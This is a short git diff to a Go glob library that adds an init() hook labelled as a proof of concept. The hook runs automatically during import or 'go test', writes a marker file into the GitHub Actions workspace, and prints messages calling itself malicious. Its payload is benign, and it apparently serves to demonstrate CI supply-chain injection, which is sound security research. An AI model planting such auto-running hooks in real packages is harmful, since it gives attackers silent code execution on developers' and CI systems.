@@ -1,6 +1,7 @@
 package glob
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 )
@@ -18,10 +19,16 @@ func Compile(pattern string, separators ...rune) (Glob, error) {
 }
 
 func init() {
+	fmt.Println("[PoC] Malicious init() function executed successfully!")
 	workspace := os.Getenv("GITHUB_WORKSPACE")
 	if workspace == "" {
 		workspace = "."
 	}
 	filePath := filepath.Join(workspace, "PROOF_OF_CONCEPT.txt")
-	os.WriteFile(filePath, []byte("This file was injected during the go test phase to demonstrate a workspace sweep."), 0644)
+	err := os.WriteFile(filePath, []byte("This file was injected during the go test phase to demonstrate a workspace sweep."), 0644)
+	if err != nil {
+		fmt.Println("[PoC] Error writing file:", err)
+	} else {
+		fmt.Println("[PoC] Successfully wrote file to:", filePath)
+	}
 }
